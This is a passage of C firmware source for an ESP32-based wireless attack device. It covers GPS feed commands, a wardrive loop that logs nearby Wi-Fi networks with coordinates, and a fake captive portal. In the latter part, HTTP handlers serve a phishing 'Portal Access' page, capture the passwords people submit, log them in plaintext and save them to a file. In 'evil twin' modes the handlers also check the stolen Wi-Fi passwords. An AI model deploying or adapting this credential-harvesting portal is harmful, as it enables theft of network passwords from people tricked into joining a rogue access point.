        MY_LOG_INFO(TAG, "Longitude out of range (-180..180): %.7f", lon);
        return 1;
    }

    float alt = external_gps_position.altitude;
    float acc = (external_gps_position.accuracy > 0.0f) ? external_gps_position.accuracy : 5.0f;

    if (argc >= 4 && argv[3] != NULL) {
        endptr = NULL;
        alt = strtof(argv[3], &endptr);
        if (endptr == argv[3] || (endptr != NULL && *endptr != '\0') || !isfinite(alt)) {
            MY_LOG_INFO(TAG, "Invalid altitude: '%s'", argv[3]);
            return 1;
        }
    }

    if (argc >= 5 && argv[4] != NULL) {
        endptr = NULL;
        acc = strtof(argv[4], &endptr);
        if (endptr == argv[4] || (endptr != NULL && *endptr != '\0') || !isfinite(acc) || acc < 0.0f) {
            MY_LOG_INFO(TAG, "Invalid accuracy: '%s' (must be >= 0)", argv[4]);
            return 1;
        }
    }

    external_gps_position.latitude = lat;
    external_gps_position.longitude = lon;
    external_gps_position.altitude = alt;
    external_gps_position.accuracy = acc;
    external_gps_position.valid = true;

    if (current_gps_module == GPS_MODULE_EXTERNAL) {
        gps_sync_from_selected_external_source();
    }

    MY_LOG_INFO(TAG, "External GPS updated: Lat=%.7f Lon=%.7f Alt=%.2fm Acc=%.2fm",
                external_gps_position.latitude, external_gps_position.longitude,
                external_gps_position.altitude, external_gps_position.accuracy);

    {
        char oled_lat[20], oled_lon[20];
        snprintf(oled_lat, sizeof(oled_lat), "  Lat %.4f", lat);
        snprintf(oled_lon, sizeof(oled_lon), "  Lon %.4f", lon);
        oled_display_update_full("> GPS External", oled_lat, oled_lon, "  Fix set");
    }

    if (current_gps_module != GPS_MODULE_EXTERNAL) {
        MY_LOG_INFO(TAG, "Note: current module is %s. Run 'gps_set external' to use this feed in wardrive.",
                    gps_get_module_name(current_gps_module));
    }
    return 0;
}

static int cmd_set_gps_position_cap(int argc, char **argv) {
    if (argc == 1) {
        external_cap_gps_position.valid = false;
        if (gps_module_uses_external_cap_feed(current_gps_module)) {
            gps_sync_from_selected_external_source();
        }
        oled_display_update_full("> GPS CAP Feed", "  Fix cleared", "", "  No fix");
        MY_LOG_INFO(TAG, "External CAP GPS fix cleared (no fix).");
        return 0;
    }

    if (argc < 3 || argc > 5 || argv[1] == NULL || argv[2] == NULL) {
        MY_LOG_INFO(TAG, "Usage: set_gps_position_cap <lat> <lon> [alt] [acc]");
        MY_LOG_INFO(TAG, "Usage: set_gps_position_cap   (no args = lost fix)");
        return 1;
    }

    char *endptr = NULL;
    float lat = strtof(argv[1], &endptr);
    if (endptr == argv[1] || (endptr != NULL && *endptr != '\0') || !isfinite(lat)) {
        MY_LOG_INFO(TAG, "Invalid latitude: '%s'", argv[1]);
        return 1;
    }

    endptr = NULL;
    float lon = strtof(argv[2], &endptr);
    if (endptr == argv[2] || (endptr != NULL && *endptr != '\0') || !isfinite(lon)) {
        MY_LOG_INFO(TAG, "Invalid longitude: '%s'", argv[2]);
        return 1;
    }

    if (lat < -90.0f || lat > 90.0f) {
        MY_LOG_INFO(TAG, "Latitude out of range (-90..90): %.7f", lat);
        return 1;
    }
    if (lon < -180.0f || lon > 180.0f) {
        MY_LOG_INFO(TAG, "Longitude out of range (-180..180): %.7f", lon);
        return 1;
    }

    float alt = external_cap_gps_position.altitude;
    float acc = (external_cap_gps_position.accuracy > 0.0f) ? external_cap_gps_position.accuracy : 5.0f;

    if (argc >= 4 && argv[3] != NULL) {
        endptr = NULL;
        alt = strtof(argv[3], &endptr);
        if (endptr == argv[3] || (endptr != NULL && *endptr != '\0') || !isfinite(alt)) {
            MY_LOG_INFO(TAG, "Invalid altitude: '%s'", argv[3]);
            return 1;
        }
    }

    if (argc >= 5 && argv[4] != NULL) {
        endptr = NULL;
        acc = strtof(argv[4], &endptr);
        if (endptr == argv[4] || (endptr != NULL && *endptr != '\0') || !isfinite(acc) || acc < 0.0f) {
            MY_LOG_INFO(TAG, "Invalid accuracy: '%s' (must be >= 0)", argv[4]);
            return 1;
        }
    }

    external_cap_gps_position.latitude = lat;
    external_cap_gps_position.longitude = lon;
    external_cap_gps_position.altitude = alt;
    external_cap_gps_position.accuracy = acc;
    external_cap_gps_position.valid = true;

    if (gps_module_uses_external_cap_feed(current_gps_module)) {
        gps_sync_from_selected_external_source();
    }

    MY_LOG_INFO(TAG, "External CAP GPS updated: Lat=%.7f Lon=%.7f Alt=%.2fm Acc=%.2fm",
                external_cap_gps_position.latitude, external_cap_gps_position.longitude,
                external_cap_gps_position.altitude, external_cap_gps_position.accuracy);

    {
        char oled_lat[20], oled_lon[20];
        snprintf(oled_lat, sizeof(oled_lat), "  Lat %.4f", external_cap_gps_position.latitude);
        snprintf(oled_lon, sizeof(oled_lon), "  Lon %.4f", external_cap_gps_position.longitude);
        oled_display_update_full("> GPS CAP Feed", oled_lat, oled_lon, "  Fix set");
    }

    if (!gps_module_uses_external_cap_feed(current_gps_module)) {
        MY_LOG_INFO(TAG, "Note: current module is %s. Run 'gps_set cap' to use this feed in wardrive.",
                    gps_get_module_name(current_gps_module));
    }
    return 0;
}

// Wardrive task function (runs in background)
static void wardrive_task(void *pvParameters) {
    (void)pvParameters;
    
    MY_LOG_INFO(TAG, "Wardrive task started.");
    
    // Set LED to indicate wardrive mode
    esp_err_t led_err = led_set_color(0, 255, 255); // Cyan
    if (led_err != ESP_OK) {
        ESP_LOGW(TAG, "Failed to set LED for wardrive: %s", esp_err_to_name(led_err));
    }
    
    // Find the next file number by scanning existing files
    wardrive_file_counter = find_next_wardrive_file_number();
    MY_LOG_INFO(TAG, "Next wardrive file will be: w%d.log", wardrive_file_counter);
    
    // Wait for GPS fix before starting
    MY_LOG_INFO(TAG, "Waiting for GPS fix...");
    oled_display_update_full("> Wardrive", "  Waiting GPS...", "  Fix needed", "");
    if (!wait_for_gps_fix(120)) {  // Wait up to 120 seconds for GPS fix
        MY_LOG_INFO(TAG, "Warning: No GPS fix obtained, not continuing without GPS data - please ensure clear view of the sky and try again.");
        oled_display_update_full("> Wardrive", "  No GPS fix!", "  Stopping...", "");
        operation_stop_requested = true;
    } else {
        MY_LOG_INFO(TAG, "GPS fix obtained: Lat=%.7f Lon=%.7f", 
                   current_gps.latitude, current_gps.longitude);
        oled_display_update_full("> Wardrive", "  GPS fix OK!", "  Starting scans", "");
    }
    
    MY_LOG_INFO(TAG, "Wardrive started. Use 'stop' command to stop.");
    
    const bool external_feed = gps_module_uses_external_feed(current_gps_module);

    // Main wardrive loop (runs until user stops)
    int scan_counter = 0;
    while (wardrive_active && !operation_stop_requested) {
        // Check for stop request at the beginning of loop
        if (operation_stop_requested || !wardrive_active) {
            MY_LOG_INFO(TAG, "Wardrive: Stop requested, terminating...");
            operation_stop_requested = false;
            wardrive_active = false;
            break;
        }
        // Read GPS from selected source or pause if external fix is lost.
        if (external_feed) {
            gps_sync_from_selected_external_source();
            if (!current_gps.valid) {
                MY_LOG_INFO(TAG, "GPS fix lost! Pausing wardrive...");
                oled_display_update_full("> Wardrive", "  GPS fix lost!", "  Pausing...", "");
                while (!current_gps.valid && wardrive_active && !operation_stop_requested) {
                    gps_sync_from_selected_external_source();
                    vTaskDelay(pdMS_TO_TICKS(200));
                }
                if (operation_stop_requested || !wardrive_active) {
                    break;
                }
                MY_LOG_INFO(TAG, "GPS fix recovered: Lat=%.7f Lon=%.7f. Resuming wardrive.",
                            current_gps.latitude, current_gps.longitude);
                oled_display_update_full("> Wardrive", "  GPS recovered!", "  Resuming...", "");
            }
        } else {
            int len = uart_read_bytes(GPS_UART_NUM, (uint8_t*)wardrive_gps_buffer, GPS_BUF_SIZE - 1, pdMS_TO_TICKS(100));
            if (len > 0) {
                wardrive_gps_buffer[len] = '\0';
                char* line = strtok(wardrive_gps_buffer, "\r\n");
                while (line != NULL) {
                    if (parse_gps_nmea(line)) {
                        MY_LOG_INFO(TAG, "GPS: Lat=%.7f Lon=%.7f Alt=%.1fm Acc=%.1fm",
                                   current_gps.latitude, current_gps.longitude,
                                   current_gps.altitude, current_gps.accuracy);
                    }
                    line = strtok(NULL, "\r\n");
                }
            }
        }

        float gps_lat = current_gps.latitude;
        float gps_lon = current_gps.longitude;
        float gps_alt = current_gps.altitude;
        float gps_acc = current_gps.accuracy;
        bool gps_valid_for_cycle = current_gps.valid;
        
        // Scan WiFi networks
        wifi_scan_config_t scan_cfg = {
            .ssid = NULL,
            .bssid = NULL,
            .channel = 0,
            .show_hidden = true,
            .scan_type = WIFI_SCAN_TYPE_ACTIVE,
            .scan_time.active.min = 120,
            .scan_time.active.max = 700,
        };
        
        // Perform blocking scan to ensure results are ready before logging
        if (operation_stop_requested) {
            break;
        }
        esp_err_t scan_err = esp_wifi_scan_start(&scan_cfg, true);
        if (scan_err != ESP_OK) {
            vTaskDelay(pdMS_TO_TICKS(500));
            continue;
        }
        
        // If driver reported failure or no results, try a blocking fallback scan
        uint16_t scan_count = 0;
        esp_wifi_scan_get_ap_num(&scan_count);
        if ((scan_count == 0) || (g_last_scan_status != 0)) {
            wifi_scan_config_t fb_cfg = scan_cfg;
            fb_cfg.scan_time.active.min = 120;
            fb_cfg.scan_time.active.max = 700;
            esp_err_t fb = esp_wifi_scan_start(&fb_cfg, true); // blocking
            if (fb != ESP_OK) {
                continue;
            }
            scan_count = MAX_AP_CNT;
            esp_wifi_scan_get_ap_records(&scan_count, wardrive_scan_results);
        } else {
            scan_count = MAX_AP_CNT;
            esp_wifi_scan_get_ap_records(&scan_count, wardrive_scan_results);
        }

        // If still no records, fall back to the buffer populated by the event handler
        if (scan_count == 0 && g_scan_count > 0) {
            if (g_scan_count > MAX_AP_CNT) {
                scan_count = MAX_AP_CNT;
            } else {
                scan_count = g_scan_count;
            }
            memcpy(wardrive_scan_results, g_scan_results, scan_count * sizeof(wifi_ap_record_t));
        }

        MY_LOG_INFO(TAG, "Wardrive: scan_count=%u (status=%" PRIu32 ")", scan_count, g_last_scan_status);
        
        // Create filename (keep it simple for FAT filesystem)
        char filename[64];
        snprintf(filename, sizeof(filename), "/sdcard/lab/wardrives/w%d.log", wardrive_file_counter);
        
        // Check if /sdcard/lab/wardrives directory is accessible
        struct stat st;
        if (stat("/sdcard/lab/wardrives", &st) != 0) {
            MY_LOG_INFO(TAG, "Error: /sdcard/lab/wardrives directory not accessible");
            vTaskDelay(pdMS_TO_TICKS(1000));
            continue;
        }
        
        // Open file for appending
        FILE *file = fopen(filename, "a");
        if (file == NULL) {
            MY_LOG_INFO(TAG, "Failed to open file %s, errno: %d (%s)", filename, errno, strerror(errno));
            
            // Try creating file with different approach
            file = fopen(filename, "w");
            if (file == NULL) {
                MY_LOG_INFO(TAG, "Failed to create file %s, errno: %d (%s)", filename, errno, strerror(errno));
                vTaskDelay(pdMS_TO_TICKS(1000));
                continue;
            }
            MY_LOG_INFO(TAG, "Successfully created file %s", filename);
        }
        
        // Write header if file is new
        fseek(file, 0, SEEK_END);
        if (ftell(file) == 0) {
            fprintf(file, "WigleWifi-1.6,appRelease=v1.1,model=Gen4,release=v1.0,device=Gen4Board,display=SPI TFT,board=ESP32C5,brand=Laboratorium\n");
            fprintf(file, "MAC,SSID,AuthMode,FirstSeen,Channel,Frequency,RSSI,CurrentLatitude,CurrentLongitude,AltitudeMeters,AccuracyMeters,RCOIs,MfgrId,Type\n");
        }
        
        // Get timestamp
        char timestamp[32];
        get_timestamp_string(timestamp, sizeof(timestamp));
        
        // Process scan results
        for (int i = 0; i < scan_count; i++) {
            wifi_ap_record_t *ap = &wardrive_scan_results[i];
            
            // Format MAC address
            char mac_str[18];
            snprintf(mac_str, sizeof(mac_str), "%02X:%02X:%02X:%02X:%02X:%02X",
                    ap->bssid[0], ap->bssid[1], ap->bssid[2],
                    ap->bssid[3], ap->bssid[4], ap->bssid[5]);
            
            // Escape SSID for CSV
            char escaped_ssid[64];
            escape_csv_field((const char*)ap->ssid, escaped_ssid, sizeof(escaped_ssid));
            
            // Get auth mode string
            const char* auth_mode = get_auth_mode_wiggle(ap->authmode);
            int wifi_freq_mhz = wigle_wifi_channel_to_frequency_mhz(ap->primary);
            
            // Format line for Wiggle format
            char line[512];
            if (gps_valid_for_cycle) {
                snprintf(line, sizeof(line), 
                        "%s,%s,[%s],%s,%d,%d,%d,%.7f,%.7f,%.2f,%.2f,,,WIFI\n",
                        mac_str, escaped_ssid, auth_mode, timestamp,
                        ap->primary, wifi_freq_mhz, ap->rssi,
                        gps_lat, gps_lon, gps_alt, gps_acc);
            } else {
                snprintf(line, sizeof(line), 
                        "%s,%s,[%s],%s,%d,%d,%d,0.0000000,0.0000000,0.00,0.00,,,WIFI\n",
                        mac_str, escaped_ssid, auth_mode, timestamp,
                        ap->primary, wifi_freq_mhz, ap->rssi);
            }
            
            // Write to file and print to UART
            fprintf(file, "%s", line);
            printf("%s", line);
        }
        
        // Close file to ensure data is written
        fclose(file);
        sd_sync();
        
        if (scan_count > 0) {
            MY_LOG_INFO(TAG, "Logged %d networks to %s", scan_count, filename);
        }
        
        scan_counter++;
        
        {
            char wd_l2[64], wd_l3[64], wd_l4[64];
            snprintf(wd_l2, sizeof(wd_l2), "  Scan #%d", scan_counter);
            snprintf(wd_l3, sizeof(wd_l3), "  %d nets logged", scan_count);
            snprintf(wd_l4, sizeof(wd_l4), "  w%d.log", wardrive_file_counter);
            oled_display_update_full("> Wardrive", wd_l2, wd_l3, wd_l4);
        }
        
        // Check for stop command
        if (operation_stop_requested || !wardrive_active) {
            MY_LOG_INFO(TAG, "Wardrive: Stop requested, terminating...");
            wardrive_active = false;
            operation_stop_requested = false;
            break;
        }
        
        // Yield to allow console processing
        taskYIELD();
        
        vTaskDelay(pdMS_TO_TICKS(5000)); // Wait 5 seconds between scans
    }
    
    // Clear LED after wardrive finishes
    led_err = led_set_idle();
    if (led_err != ESP_OK) {
        ESP_LOGW(TAG, "Failed to restore idle LED after wardrive: %s", esp_err_to_name(led_err));
    }
    
    wardrive_active = false;
    wardrive_task_handle = NULL;
    MY_LOG_INFO(TAG, "Wardrive stopped after %d scans. Last file: w%d.log", scan_counter, wardrive_file_counter);
    
    vTaskDelete(NULL); // Delete this task
}

static int cmd_start_gps_raw(int argc, char **argv) {
    {
        const char *mod = gps_get_module_name(current_gps_module);
        oled_display_update_full("> GPS Raw", "  NMEA output", mod, "  Streaming...");
    }
    log_memory_info("start_gps_raw");

    if (gps_module_uses_external_feed(current_gps_module)) {
        MY_LOG_INFO(TAG, "start_gps_raw is unavailable in external GPS modes. Use '%s' instead.",
                    gps_external_position_command_name(current_gps_module));
        return 1;
    }

    int baud = gps_get_baud_for_module(current_gps_module);
    if (argc >= 2 && argv[1] != NULL) {
        char *endptr = NULL;
        long val = strtol(argv[1], &endptr, 10);
        if (endptr == argv[1] || (endptr != NULL && *endptr != '\0') || val <= 0) {
            MY_LOG_INFO(TAG, "Invalid baud rate '%s'. Use numeric value, e.g. 9600 or 115200.", argv[1]);
            return 1;
        }
        baud = (int)val;
    }

    if (gps_raw_active || gps_raw_task_handle != NULL) {
        MY_LOG_INFO(TAG, "GPS raw reader already running. Use 'stop' to stop it first.");
        return 1;
    }

    if (wardrive_active || wardrive_task_handle != NULL) {
        MY_LOG_INFO(TAG, "Cannot start GPS raw while wardrive is active. Use 'stop' to stop wardrive first.");
        return 1;
    }

    // Reset stop flag at the beginning of operation
    operation_stop_requested = false;

    esp_err_t ret = init_gps_uart(baud);
    if (ret != ESP_OK) {
        MY_LOG_INFO(TAG, "Failed to initialize GPS UART: %s", esp_err_to_name(ret));
        return 1;
    }

    gps_raw_active = true;
    BaseType_t result = xTaskCreate(
        gps_raw_task,
        "gps_raw_task",
        4096,
        NULL,
        4,
        &gps_raw_task_handle
    );

    if (result != pdPASS) {
        MY_LOG_INFO(TAG, "Failed to create GPS raw task!");
        gps_raw_active = false;
        gps_raw_task_handle = NULL;
        return 1;
    }

    MY_LOG_INFO(TAG, "GPS raw reader started at %d baud (%s). Use 'stop' to stop.",
                baud,
                gps_get_module_name(current_gps_module));
    return 0;
}

static int cmd_start_wardrive(int argc, char **argv) {
    (void)argc; (void)argv;
    oled_display_update_full("> Wardrive", "  GPS + WiFi", "  Logging to SD", "  Active...");
    log_memory_info("start_wardrive");
    
    // Ensure WiFi is initialized
    if (!ensure_wifi_mode()) {
        return 1;
    }
    
    // Check if wardrive is already running
    if (wardrive_active || wardrive_task_handle != NULL) {
        MY_LOG_INFO(TAG, "Wardrive already running. Use 'stop' to stop it first.");
        return 1;
    }
    if (gps_raw_active || gps_raw_task_handle != NULL) {
        MY_LOG_INFO(TAG, "Cannot start wardrive while GPS raw reader is running. Use 'stop' to stop it first.");
        return 1;
    }
    
    // Reset stop flag at the beginning of operation
    operation_stop_requested = false;
    
    MY_LOG_INFO(TAG, "Starting wardrive mode...");
    
    const bool external_feed = gps_module_uses_external_feed(current_gps_module);

    // Initialize GPS source
    esp_err_t ret = ESP_OK;
    if (!external_feed) {
        int wardrive_baud = gps_get_baud_for_module(current_gps_module);
        ret = init_gps_uart(wardrive_baud);
        if (ret != ESP_OK) {
            MY_LOG_INFO(TAG, "Failed to initialize GPS UART: %s", esp_err_to_name(ret));
            return 1;
        }
        MY_LOG_INFO(TAG, "GPS UART initialized on pins %d (TX) and %d (RX) at %d baud",
                    GPS_TX_PIN, GPS_RX_PIN, wardrive_baud);
    } else {
        MY_LOG_INFO(TAG, "Using external GPS feed. Provide fixes via '%s'.",
                    gps_external_position_command_name(current_gps_module));
    }
    
    // Initialize SD card main
    ret = init_sd_card();
    if (ret != ESP_OK) {
        MY_LOG_INFO(TAG, "Failed to initialize SD card: %s", esp_err_to_name(ret));
        return 1;
    }
    MY_LOG_INFO(TAG, "SD card initialized on pins MISO:%d MOSI:%d CLK:%d CS:%d", 
                SD_MISO_PIN, SD_MOSI_PIN, SD_CLK_PIN, SD_CS_PIN);
    
    // Start wardrive in background task
    wardrive_active = true;
    BaseType_t result = xTaskCreate(
        wardrive_task,
        "wardrive_task",
        8192,  // Stack size - needs to be large for file operations
        NULL,
        5,     // Priority
        &wardrive_task_handle
    );
    
    if (result != pdPASS) {
        MY_LOG_INFO(TAG, "Failed to create wardrive task!");
        wardrive_active = false;
        return 1;
    }
    
    MY_LOG_INFO(TAG, "Wardrive task started. Use 'stop' to stop.");
    return 0;
}

// HTML form for password input (default)
static const char* default_portal_html = 
"<!DOCTYPE html>"
"<html>"
"<head>"
"<meta charset='UTF-8'>"
"<meta name='viewport' content='width=device-width, initial-scale=1.0'>"
"<title>Portal Access</title>"
"<style>"
"body { font-family: Arial, sans-serif; background: #f0f0f0; margin: 0; padding: 20px; }"
".container { max-width: 400px; margin: 50px auto; background: white; padding: 30px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }"
"h1 { text-align: center; color: #333; margin-bottom: 30px; }"
"form { display: flex; flex-direction: column; }"
"input[type='password'] { padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 5px; font-size: 16px; }"
"button { padding: 12px; background: #007bff; color: white; border: none; border-radius: 5px; font-size: 16px; cursor: pointer; margin-top: 10px; }"
"button:hover { background: #0056b3; }"
"</style>"
"<script>"
"// Auto-redirect for captive portal detection"
"if (window.location.hostname !== '172.0.0.1') {"
"    window.location.href = 'http://172.0.0.1/';"
"}"
"</script>"
"</head>"
"<body>"
"<div class='container'>"
"<h1>Portal Access</h1>"
"<form method='POST' action='/login'>"
"<input type='password' name='password' placeholder='Enter password' required>"
"<button type='submit'>Log in</button>"
"</form>"
"</div>"
"</body>"
"</html>";

// HTTP handler for login form
static esp_err_t login_handler(httpd_req_t *req) {
    char buf[256];
    int ret = httpd_req_recv(req, buf, sizeof(buf) - 1);
    if (ret <= 0) {
        return ESP_FAIL;
    }
    buf[ret] = '\0';
    
    MY_LOG_INFO(TAG, "Received POST data: %s", buf);
    
    // Parse password from POST data
    char *password_start = strstr(buf, "password=");
    if (password_start) {
        password_start += 9; // Skip "password="
        char *password_end = strchr(password_start, '&');
        if (password_end) {
            *password_end = '\0';
        }
        
        // URL decode the password
        char decoded_password[64];
        int decoded_len = 0;
        for (char *p = password_start; *p && decoded_len < sizeof(decoded_password) - 1; p++) {
            if (*p == '%' && p[1] && p[2]) {
                char hex[3] = {p[1], p[2], '\0'};
                decoded_password[decoded_len++] = (char)strtol(hex, NULL, 16);
                p += 2;
            } else if (*p == '+') {
                decoded_password[decoded_len++] = ' ';
            } else {
                decoded_password[decoded_len++] = *p;
            }
        }
        decoded_password[decoded_len] = '\0';
        
        // Log the password
        MY_LOG_INFO(TAG, "Portal password received: %s", decoded_password);
        
        // If in evil twin mode, verify the password (save will happen after verification)
        if ((applicationState == DEAUTH_EVIL_TWIN || applicationState == EVIL_TWIN_PASS_CHECK) &&
            evilTwinSSID != NULL) {
            verify_password(decoded_password);
        } else {
            // Regular portal mode - save all form data to portals.txt
            save_portal_data(portalSSID, buf);
        }
    }
    
    // Send response based on previous password attempt result
    const char* response;
    if (last_password_wrong) {
        // Show "Wrong Password" message
        response = 
            "<!DOCTYPE html><html><head>"
            "<meta charset='UTF-8'>"
            "<meta name='viewport' content='width=device-width, initial-scale=1.0'>"
            "<title>Wrong Password</title>"
            "<style>"
            "body { font-family: Arial, sans-serif; background: #f0f0f0; margin: 0; padding: 20px; }"
            ".container { max-width: 400px; margin: 50px auto; background: white; padding: 30px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }"
            "h1 { text-align: center; color: #d32f2f; margin-bottom: 20px; }"
            "p { text-align: center; color: #666; }"
            "a { display: block; text-align: center; margin-top: 20px; padding: 12px; background: #007bff; color: white; text-decoration: none; border-radius: 5px; }"
            "a:hover { background: #0056b3; }"
            "</style>"
            "</head>"
            "<body>"
            "<div class='container'>"
            "<h1>Wrong Password</h1>"
            "<p>The password you entered is incorrect. Please try again.</p>"
            "<a href='/portal'>Try Again</a>"
            "</div>"
            "</body></html>";
    } else {
        // Show "Processing" message
        response = 
            "<!DOCTYPE html><html><head>"
            "<meta charset='UTF-8'>"
            "<meta name='viewport' content='width=device-width, initial-scale=1.0'>"
            "<title>Processing</title>"
            "<style>"
            "body { font-family: Arial, sans-serif; background: #f0f0f0; margin: 0; padding: 20px; }"
            ".container { max-width: 400px; margin: 50px auto; background: white; padding: 30px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }"
            "h1 { text-align: center; color: #007bff; margin-bottom: 20px; }"
            "p { text-align: center; color: #666; }"
            ".spinner { margin: 20px auto; width: 50px; height: 50px; border: 5px solid #f3f3f3; border-top: 5px solid #007bff; border-radius: 50%; animation: spin 1s linear infinite; }"
            "@keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }"
            "</style>"
            "</head>"
            "<body>"
            "<div class='container'>"
            "<h1>Verifying...</h1>"
            "<div class='spinner'></div>"
            "<p>Please wait while we verify your credentials.</p>"
            "</div>"
            "</body></html>";
    }
    
    httpd_resp_send(req, response, HTTPD_RESP_USE_STRLEN);
    return ESP_OK;
}

// HTTP handler for GET /get endpoint
static esp_err_t get_handler(httpd_req_t *req) {
    // Get query string
    size_t query_len = httpd_req_get_url_query_len(req);
    if (query_len > 0) {
        char *query_string = malloc(query_len + 1);
        if (query_string) {
            if (httpd_req_get_url_query_str(req, query_string, query_len + 1) == ESP_OK) {
                
                // Parse password from query string
                char password_param[64];
                if (httpd_query_key_value(query_string, "password", password_param, sizeof(password_param)) == ESP_OK) {
                    // URL decode the password
                    char decoded_password[64];
                    int decoded_len = 0;
                    for (char *p = password_param; *p && decoded_len < sizeof(decoded_password) - 1; p++) {
                        if (*p == '%' && p[1] && p[2]) {
                            char hex[3] = {p[1], p[2], '\0'};
                            decoded_password[decoded_len++] = (char)strtol(hex, NULL, 16);
                            p += 2;
                        } else if (*p == '+') {
                            decoded_password[decoded_len++] = ' ';
                        } else {
                            decoded_password[decoded_len++] = *p;
                        }
                    }
                    decoded_password[decoded_len] = '\0';
                    
                    MY_LOG_INFO(TAG, "Password: %s", decoded_password);
                    
                    // If in evil twin mode, verify the password (save will happen after verification)
                    if ((applicationState == DEAUTH_EVIL_TWIN || applicationState == EVIL_TWIN_PASS_CHECK) &&
                        evilTwinSSID != NULL) {
                        verify_password(decoded_password);
                    } else {
                        // Regular portal mode - save all form data to portals.txt
                        // For GET requests, query_string has same format as POST data
                        save_portal_data(portalSSID, query_string);
                    }
                }
            }
            free(query_string);
        }
    }
    
    // Send response
    const char* response;
    if (last_password_wrong) {
        response = 
            "<!DOCTYPE html><html><head>"
            "<meta charset='UTF-8'>"
            "<meta name='viewport' content='width=device-width, initial-scale=1.0'>"
            "<title>Wrong Password</title>"
            "<style>"
            "body { font-family: Arial, sans-serif; background: #f0f0f0; margin: 0; padding: 20px; }"
            ".container { max-width: 400px; margin: 50px auto; background: white; padding: 30px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }"
            "h1 { text-align: center; color: #d32f2f; margin-bottom: 20px; }"
            "p { text-align: center; color: #666; }"
            "a { display: block; text-align: center; margin-top: 20px; padding: 12px; background: #007bff; color: white; text-decoration: none; border-radius: 5px; }"
            "a:hover { background: #0056b3; }"
            "</style>"
            "</head>"
            "<body>"
            "<div class='container'>"
            "<h1>Wrong Password</h1>"
            "<p>The password you entered is incorrect. Please try again.</p>"
            "<a href='/portal'>Try Again</a>"
            "</div>"
            "</body></html>";
    } else {
        response = 
            "<!DOCTYPE html><html><head>"
            "<meta charset='UTF-8'>"
            "<meta name='viewport' content='width=device-width, initial-scale=1.0'>"
            "<title>Processing</title>"
            "<style>"
            "body { font-family: Arial, sans-serif; background: #f0f0f0; margin: 0; padding: 20px; }"
            ".container { max-width: 400px; margin: 50px auto; background: white; padding: 30px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }"
            "h1 { text-align: center; color: #007bff; margin-bottom: 20px; }"
            "p { text-align: center; color: #666; }"
            ".spinner { margin: 20px auto; width: 50px; height: 50px; border: 5px solid #f3f3f3; border-top: 5px solid #007bff; border-radius: 50%; animation: spin 1s linear infinite; }"
            "@keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }"
            "</style>"
            "</head>"
            "<body>"
            "<div class='container'>"
            "<h1>Verifying...</h1>"
            "<div class='spinner'></div>"
            "<p>Please wait while we verify your credentials.</p>"
            "</div>"
            "</body></html>";
    }
    
    httpd_resp_send(req, response, HTTPD_RESP_USE_STRLEN);
    return ESP_OK;
}

// HTTP handler for POST /save endpoint
static esp_err_t save_handler(httpd_req_t *req) {
    char buf[256];
    int ret = httpd_req_recv(req, buf, sizeof(buf) - 1);
    if (ret <= 0) {
        return ESP_FAIL;
    }
    buf[ret] = '\0';
    
    // Parse password from POST data
    char *password_start = strstr(buf, "password=");
    if (password_start) {
        password_start += 9; // Skip "password="
        char *password_end = strchr(password_start, '&');
        if (password_end) {
            *password_end = '\0';
        }
        
        // URL decode the password
        char decoded_password[64];
        int decoded_len = 0;
        for (char *p = password_start; *p && decoded_len < sizeof(decoded_password) - 1; p++) {
            if (*p == '%' && p[1] && p[2]) {
                char hex[3] = {p[1], p[2], '\0'};
                decoded_password[decoded_len++] = (char)strtol(hex, NULL, 16);
                p += 2;
            } else if (*p == '+') {
                decoded_password[decoded_len++] = ' ';
            } else {
                decoded_password[decoded_len++] = *p;
            }
        }
        decoded_password[decoded_len] = '\0';
        
        MY_LOG_INFO(TAG, "Password: %s", decoded_password);
        
        // If in evil twin mode, verify the password (save will happen after verification)
        if ((applicationState == DEAUTH_EVIL_TWIN || applicationState == EVIL_TWIN_PASS_CHECK) &&
            evilTwinSSID != NULL) {
            verify_password(decoded_password);
        } else {
            // Regular portal mode - save all form data to portals.txt
            save_portal_data(portalSSID, buf);
        }
    }
    
    // Send response
    const char* response;
    if (last_password_wrong) {
        response = 
            "<!DOCTYPE html><html><head>"
            "<meta charset='UTF-8'>"
            "<meta name='viewport' content='width=device-width, initial-scale=1.0'>"
            "<title>Wrong Password</title>"
            "<style>"
            "body { font-family: Arial, sans-serif; background: #f0f0f0; margin: 0; padding: 20px; }"
            ".container { max-width: 400px; margin: 50px auto; background: white; padding: 30px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }"
            "h1 { text-align: center; color: #d32f2f; margin-bottom: 20px; }"
            "p { text-align: center; color: #666; }"
            "a { display: block; text-align: center; margin-top: 20px; padding: 12px; background: #007bff; color: white; text-decoration: none; border-radius: 5px; }"
            "a:hover { background: #0056b3; }"
            "</style>"
            "</head>"
            "<body>"
            "<div class='container'>"
            "<h1>Wrong Password</h1>"
            "<p>The password you entered is incorrect. Please try again.</p>"
            "<a href='/portal'>Try Again</a>"
            "</div>"
            "</body></html>";
    } else {
        response = 
            "<!DOCTYPE html><html><head>"
            "<meta charset='UTF-8'>"
            "<meta name='viewport' content='width=device-width, initial-scale=1.0'>"
            "<title>Processing</title>"
            "<style>"
            "body { font-family: Arial, sans-serif; background: #f0f0f0; margin: 0; padding: 20px; }"
            ".container { max-width: 400px; margin: 50px auto; background: white; padding: 30px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }"
            "h1 { text-align: center; color: #007bff; margin-bottom: 20px; }"
            "p { text-align: center; color: #666; }"
            ".spinner { margin: 20px auto; width: 50px; height: 50px; border: 5px solid #f3f3f3; border-top: 5px solid #007bff; border-radius: 50%; animation: spin 1s linear infinite; }"
            "@keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }"
            "</style>"
            "</head>"
            "<body>"
            "<div class='container'>"
            "<h1>Verifying...</h1>"
            "<div class='spinner'></div>"
            "<p>Please wait while we verify your credentials.</p>"
            "</div>"
            "</body></html>";
    }
    
    httpd_resp_send(req, response, HTTPD_RESP_USE_STRLEN);
    return ESP_OK;
}

// HTTP handler for portal page
